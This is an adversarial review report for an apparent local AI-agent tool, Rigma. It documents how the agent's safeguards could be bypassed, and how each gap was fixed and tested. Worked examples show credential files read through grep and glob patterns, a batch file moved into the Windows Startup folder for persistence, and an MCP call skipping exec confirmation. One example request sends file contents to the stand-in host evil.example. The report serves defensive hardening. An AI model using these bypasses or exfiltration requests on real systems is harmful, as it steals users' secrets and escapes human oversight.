# R3 adversarial review — consolidated findings and fixes

Date: 2026-09-27
Fork: `C:\ComfyUI\RD\rigma-review`, branch `review/deep-audit-2026-09-22`
Method: eight adversarial review subagents, each given one subsystem and told to
reproduce every claim by calling the real code. Each was run on
`tokenjuice / deepseek-ai/DeepSeek-V4.1-Flash`, the only authorized route.

The instruction was "seems like there are invisible problems, and some really
serious ones". There were. This document records what was found, what was fixed,
what was deliberately left, and — most importantly — the **method error** that
let the serious ones hide behind a green test suite.

---

## 0. Why the existing suite did not catch any of this

Every reviewer ran the full suite. It was green before each review and green
after: **2502 Python tests, 0 failures, 3 skipped**, plus 179 frontend tests,
`tsc --noEmit` clean and `ruff` clean.

So none of the 60-odd findings below was a regression a test would have caught.
Three structural reasons, all of which recur across the findings:

1. **The test asserted the bug as correct.** `test_audit_sec13.py` pinned "an
   absolute destination is a write and keeps its old behaviour"; 
   `test_autonomous_run.py` asserted a run with pending steps reaches `done`;
   `test_phase5_mcp.py` asserted that `allow_code` alone reaches an MCP server.
   A test that encodes the defect is worse than no test: it makes the defect
   look intentional and protects it from review.
2. **The test exercised a *different* path than the one it named.** The spill
   test checked the file existed using `pathlib`, never `read_file` — so "the
   model has a way back to this data" was asserted without ever being
   exercised. The autonomous-run tests drove the completion gates through
   scripts that always did enough work to pass them.
3. **The filter was tested on the input the model *chose*, not the output it
   *resolved*.** The credential denylist was verified against the literal
   filename, so it was green on `read_file(".env")` and absent on
   `read_file(".en*")` and on `grep`. This is the single most repeated shape in
   the whole review.

The last one generalizes into the rule worth keeping: **test the boundary, not
the spelling of the boundary.** A security check is only as good as the set of
inputs it is applied to, and the interesting inputs are the ones the check does
not see.

---

## 1. Fixed — tool surface and confinement

### R3-TOOL-1 · `grep` and `find_files` read credential files  [high]

The credential denylist was applied by `read_file`, `list_directory`,
`sample_files` and `view_image` — every tool that takes a **name** the model
chose. The two tools that take a **pattern** applied nothing.

```
grep {"pattern": "SECRETKEYMATERIAL"}          -> .ssh/id_rsa:2: SECRETKEYMATERIAL
grep {"pattern": "API_KEY", "glob": "**/.env"} -> .env:1: OPENAI_API_KEY=sk-...
read_file(".env")                              -> refused
```

The default workspace is `Path.home()`, so `~/.ssh/id_rsa` was one grep away,
and the content could then leave through `fetch_url` — an auto-run GET, which
the outbound-POST grant does not gate.

**Fix:** the denylist moved into `_iter_workspace_files`, the one walker `grep`
and `find_files` share, so both are covered and any walker-based tool added later
inherits it. `_credential_path_reason` is now applied where the files are
enumerated rather than where the request is parsed.

### R3-TOOL-3 · `read_file` with a glob dumped credential files  [high]

Same root cause, different mechanism. `_read_path` ran the denylist on the
*literal* string; a glob does not exist on disk, so it passed, and `_glob_under`
tested containment and nothing else.

```
read_file(".env")  -> refused
read_file(".en*")  -> (your pattern '.en*' matched one file: .env)sk-live-DEADBEEF
read_file("sec*")  -> secret.pem contents
```

`_glob_under` now takes an optional `ctx` and filters the **resolved hits**
through the denylist, so a pattern that resolves only onto credentials reports
"matched no files" instead of returning their contents.

### R3-TOOL-4 · `move_files`/`copy_files` wrote anywhere on disk  [high]

`_write_path` allowed any absolute destination outside the workspace, gated only
by the default-ON `allow_code`:

```
move_files {"dest": "...\\Start Menu\\Programs\\Startup", "paths": ["evil.bat"]}
  -> moved 1 file(s)
```

`write_file` — the weaker capability — has always been pinned to the workspace by
`_ws_path`. So the model reached unrestricted file placement through the sibling
tool. A planted `.bat`/`.lnk` in Startup is persistence, not data loss.

**Fix:** a new, dedicated session grant `allow_absolute_writes`, defaulting OFF
and deliberately **not** reusing `allow_absolute_reads` — reading a file and
replacing one are different risks. Added to `MUTABLE_FIELDS`, `_FIELD_TYPES`,
the session defaults, the MCP grant readers, all three product `ctx` builders
(`serve.py` ×2, `_macro_tool_ctx`), and the UI (`grants.ts`, so it is visible
and changeable rather than server-only).

### R3-TOOL-5 · `view_image` ignored the absolute-read grant  [medium]

```
view_image({"path": "C:\\outside\\shot.png"})   -> sentinel, bytes base64'd in
view_images({"folder": "C:\\outside"})          -> refused
list_directory({"path": "C:\\outside"})         -> refused
```

The one read path that skipped `allow_absolute_reads`. A prompt-injected model
could pull any image off the disk into the conversation, and from there out
through `fetch_url`.

**Fix:** an absolute image outside the workspace now needs the grant, using the
same `_inside_workspace` predicate `_read_path` uses. When **no** workspace is
set there is no boundary to escape, so the grant is not required — refusing
there would confine nothing and would only break a caller that deliberately runs
without a workspace. Every ctx the product builds sets one.

### R3-TOOL-6 · `edit_file` had no size cap  [medium]

`read_file` refused a 20 MB file; `edit_file` read it whole, then read it again
for the undo snapshot.

**Fix:** `_EDIT_MAX_BYTES` (8 MB), the same ceiling, named separately because the
two are different budgets that happen to agree.

### R3-TOOL-7 · the spill recovery path could not be read  [medium]

Oversized results were written to `rigma_home()/results` and the model was told:

```
Read more with: read_file path="C:\Users\...\.rigma\results\grep-a32438e4.txt"
```

which the read gate refuses without `allow_absolute_reads`. It worked only when
the workspace happened to contain `rigma_home` — i.e. the default home
workspace. Every project workspace and every autonomous run (which sets its own)
lost the data with an instruction that could not succeed, and nothing said the
missing piece was a grant.

**Fix:** spill into `<workspace>/.rigma-results/`, and name the file with a
**relative** path. `.rigma-results` was added to `IGNORE_DIRS` so Rigma's own
scratch output does not appear in the model's searches or get watched for undo.

### R3-TOOL-2 · MCP tools bypassed `confirm_exec` and `no-delete`  [high]

The `mcp__` branch checked `allow_code` only. Since `allow_code` is ON by default
and `confirm_exec` is OFF, a configured MCP shell or filesystem server was
**strictly easier to reach** than `run_shell`, and `exec_decision` — the single
decision point the other three exec tools share — was never consulted.
`no-delete` was not honoured either.

**Fix:** the branch now requires `_exec_confirmed(ctx)` (so a library embedder
that never sets the field keeps the old behaviour, while the product default is
safe), and applies `_text_refusal` to the call's arguments so a `no-delete` run
cannot reach deletion through a server.

---

## 2. Fixed — persistence and state

The theme here is one torn write turning into permanent loss, because every
loader in this project treats an unreadable file as "empty".

### R3-STORE-1 · calibration.json was not atomic  [high]

A truncated file loaded as `{}`; the **next** save wrote that `{}` back plus one
entry — destroying every other measured model. Fixed with a new
`src/rigma/atomicio.py`: temp file beside the target, unique per write, fsync
before the rename.

### R3-STORE-2 · `prune_calibration` evicted other models  [high]

It grouped by **hardware identity alone**, so `keep_per_identity=1` kept one
entry per GPU *across every model on it*. Calibrating model B evicted model A,
and because `save_calibration` prunes on every save, two models on one card
oscillated and neither ever stayed calibrated. The grouping key is now
`(model:quant:backend, identity)`.

### R3-STORE-3 · `state.json` was the only store with no tmp+replace  [medium]

A torn state.json reads as "nothing running", so `rigma up` starts a second
engine and the live one is orphaned — unkillable via `rigma stop`, holding its
VRAM and port. Now atomic.

### R3-STORE-4 · `update_state` raised `KeyError('engine')`  [medium]

`_FIELD_DEFAULTS` omitted `engine` while `_write_record` did `rec["engine"]`, so
`perform_unload()` on a state.json written before the field existed raised —
**after** the engine had already been killed, leaving a record claiming a live
engine. Now `.get("engine")` and named in the defaults.

### R3-STORE-5 · `os.replace` itself is not concurrency-safe on Windows  [found by testing]

Found while writing the regression test for the unique temp name, not by
reasoning: four threads writing one path produced
`PermissionError(13, 'Access is denied')`. A unique temp name stops two writers
clobbering each other's *file*, but not two writers renaming onto the same
*destination* at the same instant. `atomic_write_text` now retries that specific
transient errno with bounded backoff.

**This is the single most useful thing the review produced**, because it is a
bug in the *fix* for a different bug, and only a test that actually ran the
concurrent case could have found it.

---

## 3. Fixed — the autonomous run loop

### R3-RUN-1 · a run reported "mission complete" having done nothing  [high]

When the mission compiler falls back — `parse_spec` returns None for any reply
that is not a valid spec object, a documented and deliberate path — the plan
stays **empty**, so `pending` is empty; and the fallback step's verification is
`type: none` with no artifact, so `missing` is empty. Both completion gates were
therefore vacuous, and the only remaining gate merely forced one extra turn that
a second `task_complete` satisfied.

```
STATUS done | HALT task_complete (verified) | ITER 1 | PLAN [] | ACTIONS 2
```

Two `task_complete` calls, no file written, no verification tool ever run. The UI
rendered "finished — the mission is complete".

**Fix:** an evidence gate. A completion claim is only accepted if the run
performed at least one successful non-bookkeeping tool call, counted over the
**whole run** (so a run that did its work earlier and is now tidying up can still
finish). Otherwise the run ends `stalled` with "claimed the mission was complete
without doing any work".

Note the first attempt at this fix was wrong and the suite caught it: seeding the
fallback step into the plan made every subsequent `manage_plan add` number around
it (#2 instead of #1), breaking the model's own step references. The gate is the
right fix; the plan seeding was not.

### R3-RUN-2 · after 2 challenges the run was written done with steps pending  [medium]

```
STATUS done | CHALLENGES 2 | PLAN [{pending}, {pending}]
```

`missing` and `pending` were both skipped once the challenge budget was spent,
and the summary listed only BLOCKED steps — so the pending ones were invisible.

**Fix:** when the budget is spent with work outstanding the run ends `stalled`
with "STOPPED SHORT", naming the missing deliverables and the pending steps.

### R3-RUN-3 · the spill directory grew without bound  [medium]

One full-size file per oversized tool result, never pruned; a long run polling
`job_output` every turn left thousands. Now bounded by count (200) **and** total
bytes (256 MB), because either alone can be defeated.

### R3-RUN-4 · `budget_hours: NaN` produced a six-minute run  [low]

`nan <= 0` is False and `max(0.1, min(nan, 48.0))` is 0.1. Now rejected with
`math.isfinite`.

### R3-RUN-5 · one unreadable run.json stranded the run slot  [medium]

`runs.load` swallows every exception and returns None, so "I could not read my
own state" was indistinguishable from "the run was deleted", and the loop simply
broke. The run then claimed to be running with no driver: pause and inject
answered 409 "run has no driver", restart 409 "run is running", a new run 409 "a
run is already active". Only Stop could clear it. Now retried briefly, and a
still-unreadable state releases the slot with `interrupted`.

---

## 4. Fixed — CLI and harness

### R3-CLI-1 · `rigma harness --json` exited 0 on drift  [medium]

The `as_json` branch returned above the drift check. The comment beside that
check records that this command "used to exit 0 either way — so
`rigma harness && ...` was a green light"; the fix had landed only in the human
branch. A script parsing the JSON is exactly the caller that cannot see the
printed word `DRIFTED`. Extracted to `_exit_on_drift` and called from both.

### R3-CLI-2 · `--port 0` / `--port 70000` crashed  [low]

`bind` raises `OverflowError`, not `OSError`, for a port outside 0–65535, and
every call site iterates `(port, port - 1)`. Now caught, plus an explicit range
check in `up()` that names the range.

### R3-HARN-1 · DSH silently ignored the permission setting  [high]

`harness_dsh.run_turn` accepts `permission` and drops it by design (DSH's
confinement is its own bundle's business), but the UI rendered the
"off — no tools at all" selector for every non-native backend. A user could arm
a safety setting and have nothing happen, with nothing on screen saying so.

**Fix:** the adapter declares `honours_permission=False`; the UI renders the
selector only for a backend that applies it, and shows a sentence instead
otherwise. An older server that does not send the field reads as honouring it,
which keeps the control rather than silently removing it.

### R3-HARN-2 · the disclosure explaining that was unreachable  [medium]

The `unsupported` list — including "the sandbox pins danger-full-access, so a
confined profile does not survive the seam" — was rendered only for backends that
are **unusable**. Choosing a working external agent hid the entire disclosure,
which is the normal case. Now shown for the selected backend.

---

## 5. Fixed — the chat turn and the environment

### R3-CHAT-1 · a message-less turn bypassed the per-session guard  [high]

The guard was `if message and sid in _streaming`, and the `message` half is what
made it bypassable. `regenerate` and the queued-prompt replay both call the
endpoint with **no** message — a continuation of an existing transcript — which
is exactly the set of callers that must not start a second turn.

Measured: two concurrent `{"message": null}` requests on one session both
passed, both reached `_cancels[sid] = cancel`, and the second overwrote the
first's cancel token. The first turn then became unstoppable by the Stop button
(the UI cancels the token it last saw, which was the second's), and two agent
loops shared one transcript — the interleaving AUDIT 03-5 closed for autonomous
runs, reached through the other door.

**Fix:** the queue branch is entered on `sid in _streaming` alone. A
continuation cannot be *queued*, because it is not a new instruction — it is the
same turn's next step — so it is refused 409 and the caller retries once the
reply lands. A new prompt is still queued exactly as before.

### R3-HARN-6 · the DSH adapter handed the agent the whole environment  [medium]

AUDIT 13-6 found precisely this for mcode — `{**os.environ}` gave a third-party
autonomous agent `HF_TOKEN`, `GEMINI_API_KEY`, `TAVILY_API_KEY` and every other
secret the owner had exported, readable by `printenv` and by anything the agent
spawns — and fixed it there. `harness_dsh` kept `os.environ.copy()`, so the
identical leak survived in the sibling adapter: DSH's runner spawns a Node child
that inherits it, and DSH's own shell tools read it.

Verified against HEAD: `os.environ.copy()` is the line, in `drive_turn`.

**Fix:** the allowlist moved to `harness.HARNESS_ENV_ALLOWLIST` and the filter to
`harness.harness_env()`, which mcode now wraps. One list, one function, no second
copy for the next adapter to forget. `harness_env(also=…)` names what a specific
child cannot start without — DSH resolves its provider key through
`apiKeyEnv: DEEPSEEK_API_KEY`, so filtering that out would leave the agent unable
to reach the local server at all. This is the **third** instance in this review
of the same bug fixed twice in two files, which is why the fix is deduplication
rather than a second copy of the list.

---

## 6. Fixed — the session store and the home directory

### R3-STORE-3 · an unguarded whole-row save clobbered a live turn  [high]

The grants endpoint is used *while* a turn is running — that is what it is for:
the model asks to run a command, the user arms `allow_code`, the turn continues.
`sessions.load` → mutate → `sessions.save` writes the **whole row**, and the turn
loop saves its own copy, so whichever wrote last won outright: arming a grant
mid-turn could silently discard the messages the turn had just produced, and the
next turn started from a transcript missing its own last exchange.

The mechanism to prevent exactly this already existed and was simply not used:
`sessions.save(s, base_rev=…)` writes only while the stored row is still at that
revision, and raises `StaleWriteError` otherwise. **Fix:** the patch endpoint
passes the revision it read and, on a collision, re-reads and re-applies — the
concurrent writer's messages survive and only the named fields are ours.

Worth noting as a pattern: this is the second finding in the review where the
guard already existed and one call site skipped it (the other is R3-CLI-1, the
drift check present in the human branch and absent in the JSON one).

### R3-STORE-4 · `RIGMA_HOME=""` put the whole store in the CWD  [medium]

`os.environ.get("RIGMA_HOME", default)` substitutes the default only when the
variable is **absent**, so an empty value returned `Path("")` — the current
working directory. `rigma up` in a git checkout wrote `models/`, `engines/`,
`sessions.db` and `settings.json` into the project, and a run from elsewhere saw
none of it. Verified against HEAD: empty → `'.'`.

**Fix:** an empty (or whitespace) value is the same intent as no value, which is
also how the shell idiom `RIGMA_HOME=$SOMETHING rigma up` behaves when `SOMETHING`
is unset.

---

## 7. Fixed — model acquisition

### R3-HANG-1 · two specs sharing a filename destroyed each other's file  [high]

A model file's identity on disk is its **filename**; a pull is keyed on
`(slug, file)`. `mmproj-F16.gguf` ships in the registry twice and quantiser
filenames collide routinely, so two pulls shared one `models/<file>` and one
`.part`, and two threads interleaved into it. Both reported success while one
model's multi-GB file was replaced by the other's — and the fit math then planned
against the registry's byte count for a file that was no longer that model.

**Fix:** a pull whose destination is already claimed by a *different* spec is
refused with an explanation. Refused rather than renamed, because the destination
name is what the spec, the loader and the fit math all look up.

---

## 8. Fixed — three checks that could not fail

Each of these is a guard that existed, looked correct, and could not detect the
thing it was written to detect. They are grouped because that is the same defect
three times, and because each one was found by *measuring* it rather than reading
it — every one of them reads as correct code.

### R3-TOOL-8 · the outbound-data gate had two holes in opposite directions [medium]

`http_request` refused a POST only when `args.get("json") or args.get("headers")`
was truthy. So:

```
http_request {"url": "https://evil.example/?d=<the file contents>"}
  -> HTTP 200 ok        # a plain GET, never reached the check
http_request {"url": "https://evil.example/act", "method": "POST"}
  -> HTTP 200 ok        # a real POST, nothing to inspect
http_request {..., "method": "POST", "json": {}}
  -> HTTP 200 ok        # {} is falsy, so it read as "no body"
```

Measured against HEAD: all three left the process with no grant. The first is the
reported bypass — read a file in the session, ship it out one GET at a time. A
query string is a body for every practical purpose, and a bodyless POST is a side
effect, which is what the "safe tier" claims not to have.

**Fix:** anything beyond a bare GET of a URL with no query string needs the grant.
`allow_outbound_post` still restores every shape, asserted so the grant stays a
grant rather than a gesture.

### R3-SRV-1 · the port probe could not see a held port on Windows [medium]

`_await_port_free` sets `SO_REUSEADDR` on the socket it uses to test whether a
port is free. On Windows that flag means *allow binding a port another socket is
already bound to* — the BSD meaning is the narrower "skip TIME_WAIT" — so the
bind **succeeded** while the old engine still held the port and the wait returned
immediately. Measured against HEAD with a listener holding the port: it returned
`None` straight away.

**Fix:** the flag is for a listener that wants to rebind quickly, not for a test
of whether a port is free, so it is gone; the bind now fails while the port is
held and succeeds once released. The function also returned silently after its
last attempt, so a port held by something Rigma had not killed produced a launch
that failed later with a message about the *engine*; it now reports whether the
port came free and both call sites name the port.

### R3-MEM-1 · a cosine across two embedding spaces is not a similarity [medium]

A stored `vec` carried no record of the embedder that produced it, and the
preference list has **two** entries. A machine that lost its cached nomic (a
cleared TEMP, an offline HF cache) silently fell back to bge and then compared
every memory written by the first against queries embedded by the second. The
`_DENSE_BASELINE = 0.40` anisotropy correction was measured on nomic and is the
wrong number for bge: unrelated pairs could clear the floor and be injected as
"relevant", or related pairs could fall under it and be lost.

The same function had a sharper problem: `zip` stops at the shorter input, so two
vectors of different lengths were compared over the overlap and the result
treated as a real similarity. Measured against HEAD, a 768-d vector against a
384-d one scored **1.0** — a perfect match between two vectors that are not in
the same space at all.

**Fix:** rows record which embedder wrote them, the live space is exposed as
`memory.embedder_name()`, and `_cos` refuses to score a pair that is not
comparable. Refusal means the score falls back to its lexical half, so a stale
row degrades to lexical-only rather than to a meaningless cosine. An **untagged**
row is still compared, because refusing would silently switch every existing
memory to lexical-only — the length check still catches the case that breaks.

---

## 9. Fixed — the fourth batch: stores, the engine fetch, the CLI, and the chat loop

### R3-ENG-1 · an engine download could land anywhere the pinned host sent it [high]

`_manifest_ok` checks that the pinned `url_base` is on `ENGINE_URL_ALLOWLIST`, but
that is a statement about where the request **starts**. `_fetch` passed
`follow_redirects=True` with nothing checking where it **ended** — and the
artifact in question is the engine archive whose extracted binary Rigma then
executes.

The fix is not a single-host check, and measuring showed why: GitHub answers a
`github.com/<org>/<repo>/releases/download/...` GET with a 302 to a signed
`release-assets.githubusercontent.com` URL (measured 2026-09-28), so a strict
one-host rule would refuse every legitimate engine download and the first user to
hit it would be told the pin was broken. `ENGINE_REDIRECT_ALLOWLIST` names that
hop explicitly, with the measurement recorded beside it, and
`RIGMA_ENGINE_URL_ALLOW` is the named, opt-in extension for a self-hosted mirror —
there is no "allow anything" value.

### R3-STORE-10 · twelve fixed temp names that could collide [medium]

`atomicio`'s own docstring states the rule — the temp name must be unique per
write — and twelve call sites kept a fixed `<name>.tmp`. The documented failure is
measured: two concurrent writers share the temp file, one replaces the other's
half-written bytes, or the rename fails with `PermissionError [WinError 32]`. The
run loop saves `run.json` every turn while a tool thread can save `live.json`, so
this is the concurrency it actually meets. Every fixed name is gone, and a test
asserts that over the **whole package** rather than a list of modules — a list has
to be maintained, which is how twelve call sites were missed.

Three of the twelve were not the same bug:

- `registry.update_registry` shared a fixed staging **directory**. Two concurrent
  `rigma update` runs — or a CLI update racing the server's — meant the second
  `rmtree` deleted the first's extraction mid-flight and the swap-in failed on a
  half-extracted tree.
- `serve.py`'s usage-stats write happens per turn and several turns finish at
  once, which is exactly when a shared `usage.tmp` collides.
- `runtime.ensure_engine`'s lock write was already temp+replace (AUDIT F08-4) but
  with a shared name.

`atomicio.atomic_write_text` gained `create_only=True` for the one case
`os.replace` cannot express: exclusive creation, where "already exists" is an
answer rather than a race to be resolved. It is still atomic — the check and the
write are one operation because `os.link` fails when the destination is there.

### R3-CLI-3/4 · `recalibrate --all` wiped without asking, and not atomically [low]

`--all` cleared every stored tune on the machine with no confirmation and no way
back. A tune is the result of a sweep that takes minutes per model and is not
reconstructible from anything else. It now confirms, and `--yes`/`-y` skips the
prompt for a script. The `--model` branch wrote `calibration.json` with a bare
`write_text` — the same store the atomic writer was added for, so a crash
mid-write leaves a truncated file that loads as `{}` and destroys every **other**
model's measurement on the next save. That call site was simply missed.

### R3-HARN-7 · a test that passed alone and failed in a full run [low]

`fake_cli` never set `FAKE_MCODE_VERSION`, so the fake CLI reported its default
0.5.1 against a pin of 0.5.4. That only worked because the adapter used to copy
the **whole** environment into the child and the variable happened to be set in
the ambient one. With the allowlist in place the first turn emitted a drift
notice and latched the process-global `_DRIFT_SAID`, so every later test asserting
an exact notice list failed by test **order**. The fixture now sets the version it
means, and the cancel test resets the latch it asserts about. The same class of
problem — a test whose result depends on which other tests ran — is what made
`tests/test_phase4_lifecycle.py`'s two restart tests fail: they did only
`manage_plan` work before their first stop, which the R3-RUN-1 evidence gate now
correctly refuses to call a finished run.

### R3-CHAT-2 · nothing watched for a model repeating itself [medium]

The per-turn round cap is a runaway **backstop** — 1000 by default — and nothing
else watched the loop. A model that kept issuing the same call with the same
arguments therefore ran to the ceiling: a thousand round trips, each re-prefilling
the whole transcript, which on a local card is minutes of GPU time and a context
full of identical tool results. The chat looks busy the entire time, which is why
this is worth stopping rather than reporting after the fact.

The signature is the **set** of `(name, args)` pairs in a round, compared on the
resolved arguments so reformatting the same JSON does not read as progress, and
reset on any round that differs — so a long turn that keeps doing something new is
untouched no matter how long it is. Two different calls alternating count as one
repeating signature, which is the same defect wearing a hat. Four consecutive
repeats stops the turn.

The notice is stream-only, never persisted as the assistant's own words: a
server-authored message written into the transcript poisoned a chat once already
(live corruption 2026-07-21). The end-of-turn notice also distinguishes this from
the round-limit case, because "raise the limit" is the wrong advice for a loop.

Two things learned while writing its tests, both worth recording because they are
how a green test can mean nothing: `_say` in the chat-loop harness emits **one SSE
event per character**, so a reply has to be reassembled from the deltas before it
can be searched for a phrase — the first version of the "progress" test asserted
against the raw stream and failed on a turn that had in fact worked. And this
chat's last **stored** message is a tool-result summary rather than the reply, so
the assertion belongs on the response body.

### R3-CHAT-3 · a chat already over the window could never compact itself [medium]

Auto-compaction fires at the **end** of a turn, using the engine's real
`prompt_tokens`. That works while a chat grows normally, but it cannot rescue a
chat that is **already** over the window: the turn that would have triggered the
compaction never completes, so `prompt_tokens` is never reported, so the
compaction never runs. The chat 400s on every message from then on, and the only
way out is the manual Compact button — which is exactly the state a user cannot
diagnose from the error.

There is now a pre-send check in `_llm_turn`: if the assembled prompt estimates at
or over `AUTO_COMPACT_FRACTION` of the budget and there is more than
`AUTO_COMPACT_KEEP` of history, the fold runs **before** the request, the messages
are rebuilt, and a stream-only notice says so.

The estimate is deliberately crude (`chars / 2`, against a measured 1–4 chars per
token on this machine) and is used only to decide whether to compact **early**. A
false positive costs one summary; a false negative leaves the chat wedged, so the
constant sits on the pessimistic side of the measured range. A summariser failure
is logged and the turn proceeds — the user's message is never blocked by an aux
call being down. The test asserts the summariser request comes **first**, by order
rather than presence, because "a compaction happened somewhere in this turn" would
also pass if it fired after the reply that was supposed to fail.

---

## 10. Deliberately not changed

These are real findings that were left alone, with the reason.

- **`~/.rigma/results` is also never cleaned** — covered by R3-RUN-3 for the
  workspace case; the home fallback inherits the same pruning.
- **The default workspace is the whole home directory** (`serve.py`,
  `sessions.py`), so the tools are on across everything the user owns. Changing
  this is a product decision about what Rigma *is*, not a bug fix, and the owner
  has not asked for it. Recorded here so it is a known position rather than an
  oversight.
- **`runtime.ensure_model` trusts any file at `models/<file>`** with no size or
  hash check, so `rigma up` can launch on a truncated file. Real, but fixing it
  properly needs `sha256` to have a producer (`GgufFile.sha256` is `null` for all
  142 live entries, so the hash gate in `_install_download` is dead code). That
  is a two-part change and belongs in its own pass.
- **The engine binary is executed with no pinned checksum on first install**, and
  `_fetch` follows redirects to any host. `engines.json` carries no hash at all.
  Fixing this means publishing per-asset digests, which is a release-process
  change, not a code change.
- **`no-network` filters tool *names* only**, so with `confirm_exec` granted a
  `no-network` run can still reach the network through `run_shell`. Whether the
  profile promises "no network tools" or "no network I/O" is the owner's call.
- **A run started with an empty workspace silently uses the home directory.**
  Same class as the default-workspace item above.
- **`server_ops.expected_tg` only reads the legacy calibration key**, so the
  engine-room health verdict is permanently "unknown" on any install without
  pre-R3-CAL-1 rows. Cosmetic; no data loss.
- **`prune_calibration`'s remaining cap** keeps one entry per
  `(model, quant, backend, identity)`. Two entries for the same model on the same
  card cannot coexist, which is intended.
- **A pre-identity calibration row is replayed on different hardware**
  (`hwid.py`). A row written before the hardware identity was recorded is matched
  by nothing, so it is not replayed — the risk is the opposite one, that it is
  *ignored* and the machine re-calibrates. Fixing it needs a decision about
  whether an unidentifiable measurement is better discarded or trusted, and
  discarding is the safe answer, which is what it already does.
- **`rigma recalibrate --all` wipes every measurement with no confirmation.**
  The CLI has a `--yes` convention elsewhere; this one predates it and changing
  it is a UX decision, not a defect.
- **The engine binary is fetched with no resume, and hashes via
  `read_bytes()`.** A multi-GB download that drops starts over, and the hash
  holds the whole file in memory. Real, but it is a throughput fix rather than a
  correctness one, and the redirect allowlist (R3-ENG-1) is the security half.
- **The first install of an engine has no pinned checksum** — it records the
  digest it saw and verifies re-downloads against it (trust on first use). Adding
  a pin would not help on its own: a checksum published in the same GitHub release
  as the artifact is fetched over the same channel from the same host, so an
  attacker who can replace the archive can replace the checksum beside it. The pin
  only adds security if it comes from a different channel, which is a release and
  distribution decision rather than a code change. Recorded as a position instead
  of left implied.
- **`WORK_GET_ROUTES` covers three of at least eight process-spawning GET
  routes.** The list is a denylist of GETs that are not safe to auto-run, and a
  route added later is not on it. Inverting it to an allowlist is the right
  shape, but it needs each route classified, which is a review of its own.
- **`/api/runs/{rid}/log` answers 200 `{"log": ""}` for every failure**, so a
  missing run and an empty log are the same response. Cosmetic; the UI shows
  nothing either way, which is at least not a lie.
- **`server_ops.expected_tg` only reads the legacy calibration key**, so the
  engine-room health verdict is permanently "unknown" on an install without
  pre-R3-CAL-1 rows. Cosmetic; no data loss.
- **A failed DSH runner reports two errors** — the runner's and the adapter's.
  Redundant rather than wrong.

---

## 11. Verification

Every fix above is covered by a test that fails against the code before it.

- `tests/test_r3_adversarial_fixes.py` — 50 tests, one or more per fixed finding.
  Each was checked **red against HEAD** before being accepted as green. The later
  batches were verified against the real HEAD source rather than assumed, and the
  measurements are quoted in the sections above: `os.environ.copy()` in
  `drive_turn`; `if message and sid in _streaming`; `RIGMA_HOME=""` → `'.'`; three
  outbound shapes leaving the process with no grant; a held port returning `None`;
  a 768-d vs 384-d vector pair scoring `1.0`; and the absence of both
  `_redirect_allowed` and `ENGINE_REDIRECT_ALLOWLIST`.
- The chat-guard test drives the **real endpoint** with `_streaming` seeded to
  the state a second request actually hits, rather than asserting on source text
  — the source-text version was written first, matched its own explanatory
  comment, and was replaced.
- `tests/test_autonomous_run.py` — the completion-gate tests were rewritten
  because the old ones **asserted the defect**; new tests pin that a run with
  outstanding steps, and a run that did nothing, cannot report done.
- `tests/test_phase5_mcp.py` — the MCP grant tests were updated, and two new
  tests pin the `confirm_exec` requirement and the `no-delete` case.
- `tests/test_audit_sec13.py`, `tests/test_audit_tools.py`,
  `tests/test_r3_image_credentials.py` — the tests that encoded the old
  behaviours were updated to assert the new boundary *and* to still exercise the
  capability through the grant, so nothing was silently dropped.

Three tests were wrong for **test-side** reasons while writing these batches, and
each is worth naming because the failure mode recurs:

1. a `view_image` test that passed an absolute path with no workspace — there is
   no boundary to escape, so the grant is not required, and the fix had to be
   narrowed to the case that actually escapes;
2. a source-text assertion that matched the comment explaining the fix;
3. a `monkeypatch.undo()` that also reverted the `RIGMA_HOME` the test needed, so
   the "success" case silently ran against the real home directory.

A fourth is a different shape and worth separating: `_await_port_free` is stubbed
in three test files with `lambda *a, **k: None`, which was correct when the
function returned `None` either way and became "the port is held" the moment it
started reporting. The stubs now return `True`, and `test_server_ops_ctx`'s
fixture needed one added — the real probe correctly reports that **this machine's**
Rigma holds port 11499, which is precisely the detection that was missing. A
stub that silently absorbs a new return value is how a fix stops being tested.

A fifth is the sharpest of them, because the test was **green in isolation and red
in the full suite** and the code was never wrong. Two tests in
`tests/test_r3_prompt_queue.py` asserted on `inspect.getsource(serve.build_app)` —
source text, deliberately, because the difference between the two release paths
*is* the fix and neither can be reached from outside. In a full-suite run that call
returned the body of a **different function**, so the assertions failed against
text that was never `build_app`'s. They now read `serve.__file__` directly, which
is the same assertion with no line-number indirection. The lesson is the same one
the whole round is about: an assertion that resolves its subject indirectly is
testing the resolution as much as the subject.

Full suite, frontend suite, `tsc --noEmit` and `ruff` results are recorded in the
commit messages for this batch.
